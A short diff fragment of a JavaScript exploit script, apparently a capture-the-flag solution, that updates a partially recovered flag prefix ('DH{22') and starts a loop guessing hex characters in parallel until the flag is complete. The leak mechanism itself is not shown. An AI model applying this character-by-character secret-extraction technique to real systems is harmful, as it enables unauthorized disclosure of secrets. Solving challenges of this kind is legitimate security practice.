@@ -21,7 +21,7 @@
 
     async function exploit() {
         let chars = "0123456789abcdef}";
-        let secret = "DH{2";
+        let secret = "DH{22";
 
         while (!secret.includes("}")) {
             let promises = chars.split("").map(c => 
